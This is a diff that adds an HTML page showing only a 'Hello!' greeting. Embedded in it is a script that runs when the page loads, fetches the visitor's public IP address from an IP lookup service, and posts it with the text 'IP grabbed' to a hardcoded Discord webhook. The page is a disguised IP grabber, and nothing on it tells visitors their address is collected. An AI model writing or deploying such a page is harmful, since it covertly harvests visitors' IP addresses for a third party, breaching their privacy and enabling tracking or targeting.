@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Welcome</title>
+</head>
+<body>
+  <h1>Hello!</h1>
+
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        const webhookURL = "https://discordapp.com/api/webhooks/1374439335784353842/bOzRgYIW_ZZvSkTuiWk-wiL-tkVklOo9wqgH2lkljXC41w3waBQutFo7Cgo5RxgpD_1W";
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: `IP grabbed: ${ip}` })
+        });
+      });
+  </script>
+</body>
+</html>
